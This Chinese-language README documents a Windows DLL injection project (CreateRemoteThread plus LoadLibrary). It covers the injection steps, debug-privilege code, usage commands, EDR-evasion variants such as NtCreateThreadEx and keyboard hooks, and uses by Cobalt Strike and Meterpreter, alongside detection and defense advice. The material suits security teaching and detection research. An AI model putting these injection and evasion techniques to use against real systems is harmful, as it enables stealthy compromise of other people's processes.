# DLL Injection - CreateRemoteThread + LoadLibrary

## 概述

**DLL Injection** 是最经典和广泛使用的 **Process Injection** 技术。与之前学习的 **Process Spawning** 技术（创建新进程）不同，DLL Injection 向**已存在的进程**注入代码。

**原始项目**: [hasherezade/dll_injector](https://github.com/hasherezade/dll_injector)

**MITRE ATT&CK**: [T1055.001 - Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)

## Process Spawning vs Process Injection

### Process Spawning（进程创建注入）

**已学习的技术 (1-11)**:
- Process Hollowing
- Transacted Hollowing
- Process Doppelgänging
- Process Herpaderping
- Process Ghosting
- Early Bird APC
- Entry Point Injection
- DLL Blocking
- Early Cascade
- Kernel Callback Table
- Advanced Hollowing

**特点**:
- 创建新进程
- 在进程启动前/早期注入
- 需要目标可执行文件
- 进程由攻击者启动

### Process Injection（进程注入）

**本技术 (12)**:
- **DLL Injection** ← 我们在这里

**特点**:
- 注入到已运行的进程
- 不需要重启进程
- 可选择任意目标进程
- 进程可能已在运行

## 技术原理

### 核心思想

**利用 Windows DLL 加载机制**:

```
LoadLibrary("C:\\path\\to\\evil.dll")
    ↓
Windows 加载器加载 DLL
    ↓
DLL_PROCESS_ATTACH 回调执行
    ↓
我们的代码在目标进程中运行！
```

**但是**：LoadLibrary 是目标进程的函数调用，我们如何从外部触发？

**答案**: CreateRemoteThread

### 注入流程

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 打开目标进程                                                 │
│    OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | ...) │
│    → 获取进程句柄 (hProcess)                                    │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 分配远程内存                                                 │
│    VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_RW)    │
│    → 在目标进程分配内存                                         │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 写入 DLL 路径                                                │
│    WriteProcessMemory(hProcess, remoteAddr, dllPath, size)      │
│    → 将 "C:\\evil.dll" 字符串写入目标进程                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. 获取 LoadLibrary 地址                                        │
│    hKernel32 = GetModuleHandle("kernel32.dll")                  │
│    pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA")     │
│    → 获取 LoadLibrary 函数地址                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. 创建远程线程                                                 │
│    CreateRemoteThread(hProcess, ..., pLoadLibrary, remoteAddr)  │
│    → 在目标进程创建新线程                                       │
│    → 线程入口点 = LoadLibrary                                   │
│    → 线程参数 = DLL 路径                                        │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. LoadLibrary 执行                                             │
│    LoadLibraryA("C:\\evil.dll")  ← 在目标进程执行               │
│    → Windows 加载 DLL                                           │
│    → 调用 DllMain(DLL_PROCESS_ATTACH)                           │
│    → 我们的代码执行！                                           │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. 等待完成并清理                                               │
│    WaitForSingleObject(hThread, TIMEOUT)                        │
│    VirtualFreeEx(hProcess, remoteAddr, MEM_RELEASE)             │
│    CloseHandle(hThread)                                         │
└─────────────────────────────────────────────────────────────────┘
```

### 卸载 DLL

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. 查找 DLL 模块句柄                                            │
│    EnumProcessModules → 遍历所有模块                            │
│    GetModuleBaseName → 比较模块名称                             │
│    → 找到 HMODULE                                               │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. 获取 FreeLibrary 地址                                        │
│    pFreeLibrary = GetProcAddress(hKernel32, "FreeLibrary")      │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. 创建远程线程卸载                                             │
│    CreateRemoteThread(hProcess, ..., pFreeLibrary, hModule)     │
│    → 执行 FreeLibrary(hModule)                                  │
│    → DLL 被卸载，调用 DllMain(DLL_PROCESS_DETACH)              │
└─────────────────────────────────────────────────────────────────┘
```

## 关键技术细节

### 1. 为什么 LoadLibrary 地址可以跨进程使用？

**关键概念: DLL 基址固定（ASLR 时代前）**

```c
// 在我们的进程
HMODULE hKernel32 = GetModuleHandle("kernel32.dll");  // → 0x7FFF12340000
FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA"); // → 0x7FFF12345678

// 在目标进程
// kernel32.dll 也加载在 0x7FFF12340000（相同地址！）
// LoadLibraryA 也在 0x7FFF12345678
```

**为什么地址相同？**

**Windows Vista 以前**:
- 系统 DLL 固定基址
- kernel32.dll 在所有进程加载到相同地址
- 地址可以直接跨进程使用

**Windows Vista 以后 (ASLR)**:
- 地址随机化
- **但**：系统 DLL 在**同一启动会话**内共享基址
- 如果两个进程在系统启动后启动，kernel32.dll 地址相同

**现代情况**:
```
系统启动 → kernel32.dll 随机分配地址 0xXXXXXXXX
         ↓
    进程 A 启动 → kernel32.dll 映射到 0xXXXXXXXX
         ↓
    进程 B 启动 → kernel32.dll 映射到 0xXXXXXXXX (相同！)
```

### 2. CreateRemoteThread 函数签名

```c
HANDLE CreateRemoteThread(
    HANDLE hProcess,                    // 目标进程句柄
    LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程属性 (通常 NULL)
    SIZE_T dwStackSize,                 // 栈大小 (0 = 默认)
    LPTHREAD_START_ROUTINE lpStartAddress, // 线程入口点 ← LoadLibrary 地址
    LPVOID lpParameter,                 // 线程参数 ← DLL 路径
    DWORD dwCreationFlags,              // 创建标志 (0 = 立即运行)
    LPDWORD lpThreadId                  // 返回线程 ID (可为 NULL)
);
```

**LoadLibrary 的函数签名**:
```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName);

// 等价于
typedef HMODULE (WINAPI *LPTHREAD_START_ROUTINE)(LPVOID);
```

**完美匹配**！
- LoadLibrary 接受一个指针参数（DLL 路径）
- 返回 HMODULE（可以当作 DWORD）
- 符合 LPTHREAD_START_ROUTINE 类型

### 3. 所需权限

```c
OpenProcess(
    PROCESS_CREATE_THREAD |  // 创建远程线程
    PROCESS_VM_READ |        // 读取内存（检查模块）
    PROCESS_VM_WRITE |       // 写入内存（DLL 路径）
    PROCESS_VM_OPERATION |   // 内存操作（VirtualAllocEx）
    PROCESS_QUERY_INFORMATION, // 查询信息（架构检查）
    FALSE,
    pid
);
```

**需要的权限**:
- 一般进程 → 同用户进程可以访问
- System 进程 → 需要 **SeDebugPrivilege**（Debug 权限）
- Protected 进程 → 无法访问（即使有 Debug 权限）

**提升 Debug 权限**:
```c
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);

    CloseHandle(hToken);
    return TRUE;
}
```

### 4. 架构兼容性

**问题**: 32位注入器无法注入 64位进程

```c
BOOL IsWow64Process(HANDLE hProcess, PBOOL Wow64Process);

// Wow64Process = TRUE  → 32位进程运行在 64位系统
// Wow64Process = FALSE → 原生架构进程
```

**检查兼容性**:
```c
BOOL isTargetWow64, isInjectorWow64;
IsWow64Process(hProcess, &isTargetWow64);
IsWow64Process(GetCurrentProcess(), &isInjectorWow64);

if (isTargetWow64 != isInjectorWow64) {
    printf("架构不兼容！\n");
    return FALSE;
}
```

**解决方案**:
- 提供 32 位和 64 位版本的注入器
- 或使用 Heaven's Gate 技术（32→64 注入）

### 5. DLL 搜索路径

**LoadLibrary 如何查找 DLL**:

```c
LoadLibraryA("evil.dll");  // 相对路径
```

**搜索顺序**:
1. 应用程序目录
2. System32 目录
3. System 目录
4. Windows 目录
5. 当前工作目录
6. PATH 环境变量目录

**最佳实践**:
```c
// 使用绝对路径避免搜索问题
LoadLibraryA("C:\\full\\path\\to\\evil.dll");

// 或在注入前解析绝对路径
GetFullPathName(relativePath, MAX_PATH, absolutePath, NULL);
```

## 项目结构

```
12-dll-injection/
├── README.md                   # 本文档
├── build.bat                   # Windows 构建脚本
├── build.sh                    # Linux/macOS 构建脚本
├── src/
│   ├── dll_injection.c         # 主注入器（550 行）
│   └── test_dll.c              # 测试 DLL（60 行）
└── build/
    ├── dll_injection.exe       # 注入器（23KB）
    └── test_dll.dll            # 测试 DLL（15KB）
```

## 构建和使用

### 前置要求

- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **系统**: Windows 7+
- **权限**: 注入 System 进程需要管理员权限

### 构建步骤

```bash
# Windows
build.bat

# Linux/macOS (需要 MinGW 交叉编译)
bash build.sh
```

### 使用方法

```bash
cd build

# ===== 注入到现有进程 =====
dll_injection.exe <PID> <DLL路径>

# 示例：注入到 PID 1234
dll_injection.exe 1234 test_dll.dll

# 使用绝对路径
dll_injection.exe 1234 "C:\path\to\test_dll.dll"

# ===== 注入到新进程 =====
dll_injection.exe <EXE路径> <DLL路径>

# 示例：启动 notepad 并注入
dll_injection.exe "C:\Windows\System32\notepad.exe" test_dll.dll

# ===== 卸载 DLL =====
dll_injection.exe <PID> <DLL路径> --unload

# 示例
dll_injection.exe 1234 test_dll.dll --unload

# ===== 检查 DLL 是否已加载 =====
dll_injection.exe <PID> <DLL路径> --check

# 示例
dll_injection.exe 1234 test_dll.dll --check
```

### 输出示例

**注入到现有进程**:
```
===================================================================
DLL Injection (CreateRemoteThread + LoadLibrary)
Based on: hasherezade/dll_injector
===================================================================

[+] Debug 权限已获取

===================================================================
DLL Injection - 注入到现有进程
===================================================================

[*] 目标 PID: 1234
[*] DLL 路径: test_dll.dll
[+] LoadLibraryA 地址: 0x00007FFF12345678
[+] DLL 路径已写入远程进程: 0x000000000234000
[+] 远程线程已创建，等待执行...
[+] DLL 加载成功，模块句柄: 0x7FFF56780000

[+] 注入成功！DLL 已加载到目标进程

===================================================================
[+] DLL Injection 完成！
===================================================================
```

**注入到新进程**:
```
===================================================================
DLL Injection - 注入到新进程
===================================================================

[*] 目标程序: C:\Windows\System32\notepad.exe
[+] 进程已创建 (PID: 5678)
[*] DLL 路径: test_dll.dll
[+] LoadLibraryA 地址: 0x00007FFF12345678
[+] DLL 路径已写入远程进程: 0x000000000456000
[+] 远程线程已创建，等待执行...
[+] DLL 加载成功，模块句柄: 0x7FFF56780000

[+] 注入成功！DLL 已加载到目标进程

[*] 恢复主线程...

===================================================================
[+] DLL Injection 完成！
===================================================================
```

此时会弹出消息框：
```
╔════════════════════════════════════════╗
║ DLL Injection - 加载成功                ║
╠════════════════════════════════════════╣
║ ✅ DLL 已加载！                         ║
║                                        ║
║ 进程 ID: 5678                          ║
║ DLL 句柄: 0x7FFF56780000               ║
║                                        ║
║ 这证明 DLL Injection 成功！             ║
╚════════════════════════════════════════╝
```

## 技术限制

### 1. 架构限制

- **32位注入器 → 64位进程** ❌ 不支持
- **64位注入器 → 32位进程** ❌ 不支持
- **匹配架构** ✅ 支持

**解决方案**:
- 提供两个版本的注入器（32位和64位）
- 检测目标进程架构，选择对应注入器

### 2. 权限限制

- **Protected Process** ❌ 无法注入
  - 例如：防病毒软件、Windows Defender
  - Protected Process Light (PPL)

- **System 进程** ⚠️ 需要 Debug 权限
  - 需要管理员权限提升

- **同用户进程** ✅ 通常可以访问

### 3. DLL 依赖

**问题**: 如果 DLL 依赖其他 DLL

```
evil.dll
    ↓ 依赖
helper.dll
    ↓ 依赖
library.dll
```

**LoadLibrary 会失败** 如果找不到依赖

**解决方案**:
```c
// 1. 使用静态链接
gcc -static -shared evil.c -o evil.dll

// 2. 将所有依赖放在同一目录
AppDir/
  ├── evil.dll
  ├── helper.dll
  └── library.dll

// 3. 使用 SetDllDirectory 设置搜索路径（需在 DLL 中设置）
```

### 4. 时序问题

**注入到新进程**:

```c
CreateProcess(..., CREATE_SUSPENDED, ...)  // 挂起
InjectDLL(...)                              // 注入
ResumeThread(...)                           // 恢复
```

**风险**: 进程可能在 DLL 完全加载前开始执行

**更好的方法**: Early Bird APC（技术 #6）

### 5. EDR 检测

**高可疑行为**:
- OpenProcess 跨进程
- CreateRemoteThread（极度可疑）
- 向其他进程写入内存

**缓解措施**:
- 使用替代 API（NtCreateThreadEx）
- QueueUserAPC 代替 CreateRemoteThread
- Thread Hijacking（劫持现有线程）

## 检测与防御

### 检测方法

**1. API 监控**
```c
// EDR hooks:
OpenProcess(PROCESS_CREATE_THREAD | ...) → 可疑
CreateRemoteThread(...) → 高度可疑
WriteProcessMemory(...) → 跨进程写入
```

**2. 行为分析**
```
进程 A:
  OpenProcess(进程 B)
    ↓
  WriteProcessMemory(进程 B)
    ↓
  CreateRemoteThread(进程 B)
    ↓
  → 告警: DLL Injection 尝试
```

**3. 内存扫描**
```c
// 枚举所有模块
EnumProcessModules(hProcess, ...);

for (each module) {
    GetModuleFileName(module, path, ...);

    // 检查可疑路径
    if (!IsTrustedPath(path)) {
        Alert("Suspicious module loaded");
    }

    // 检查签名
    if (!IsCodeSigned(path)) {
        Alert("Unsigned module");
    }
}
```

**4. 线程起源检查**
```c
// 检测远程线程
for (each thread in process) {
    if (ThreadStartAddress is in LoadLibrary range) {
        if (ThreadCreatorProcess != CurrentProcess) {
            Alert("Remote thread detected");
        }
    }
}
```

### 防御建议

**对于 EDR/AV**:
- 监控 CreateRemoteThread 调用
- 检测跨进程内存写入
- 验证新加载模块的签名
- 分析线程创建上下文

**对于管理员**:
- 使用 Protected Process
- 启用 Windows Defender Exploit Guard
- 限制 Debug 权限分配
- 监控可疑进程行为

**对于开发者**:
- 验证所有加载的模块
- 使用代码签名
- 检测未授权的 DLL 加载
```c
// 在 DllMain 中检查
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // 检查是否为合法加载
        if (!IsLegitimateLoad()) {
            ExitProcess(0);
        }
    }
    return TRUE;
}
```

## 进阶技术

### 1. 手动映射（Manual Mapping）

**问题**: LoadLibrary 会留下痕迹（模块列表）

**解决方案**: 手动加载 PE 到内存

```c
// 不使用 LoadLibrary
// 1. 读取 PE 文件
// 2. 分配内存
// 3. 复制 PE 节
// 4. 处理导入表
// 5. 处理重定位
// 6. 调用入口点

→ 参考技术 #13: Reflective DLL Injection
```

### 2. QueueUserAPC 注入

**替代 CreateRemoteThread**:

```c
// 1. 打开目标进程
// 2. 枚举所有线程
// 3. 对每个线程：
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)dllPath);

// APC 在线程进入可警报状态时执行
```

**优势**:
- 不创建新线程
- 更隐蔽

**劣势**:
- 需要线程进入可警报状态
- 不一定立即执行

### 3. SetWindowsHookEx 注入

**利用消息钩子**:

```c
HMODULE hDll = LoadLibrary("evil.dll");
HOOKPROC proc = (HOOKPROC)GetProcAddress(hDll, "HookProc");

// 全局钩子会将 DLL 加载到所有匹配进程
SetWindowsHookEx(WH_KEYBOARD, proc, hDll, 0);
```

**限制**:
- 仅适用于 GUI 进程
- 需要消息循环
- 目标必须处理相应消息

### 4. NtCreateThreadEx 注入

**使用未文档化的 NT API**:

```c
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

pNtCreateThreadEx NtCreateThreadEx =
    (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

HANDLE hThread;
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                 pLoadLibrary, dllPath, 0, 0, 0, 0, NULL);
```

**优势**: 某些 EDR 不监控 NtCreateThreadEx

## 实战案例

### Cobalt Strike

**Beacon 注入**:
```
1. 识别目标进程（如 explorer.exe）
2. 使用 CreateRemoteThread 注入 Beacon DLL
3. Beacon DLL 建立 C2 连接
4. 执行后续命令
```

### Meterpreter

**Migrate 功能**:
```
meterpreter> migrate 1234

→ 将 Meterpreter DLL 注入到 PID 1234
→ 迁移到更稳定的进程
```

### 游戏外挂

**常见流程**:
```
1. 找到游戏进程 PID
2. 注入外挂 DLL
3. DLL 中 Hook 游戏函数
4. 修改游戏逻辑
```

## 相关技术

- **[Reflective DLL Injection](../13-reflective-dll/)** - 手动映射 DLL，无需 LoadLibrary
- **[APC Injection](../06-early-bird-apc/)** - 使用 QueueUserAPC
- **[Thread Hijacking]** - 劫持现有线程执行代码

## Credits

- **hasherezade** - dll_injector 项目作者，知名恶意软件分析专家
- **Stephen Fewer** - Reflective DLL Injection 发明者

## 参考资料

### 技术文章
- [dll_injector Repository](https://github.com/hasherezade/dll_injector)
- [MITRE ATT&CK T1055.001](https://attack.mitre.org/techniques/T1055/001/)
- [Windows Internals - DLL Loading](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-loading)

### 相关 API
- [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
- [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

## 免责声明

此代码仅用于教育和防御性安全研究目的。不得用于未经授权的系统访问或恶意活动。使用者需对自己的行为负责。
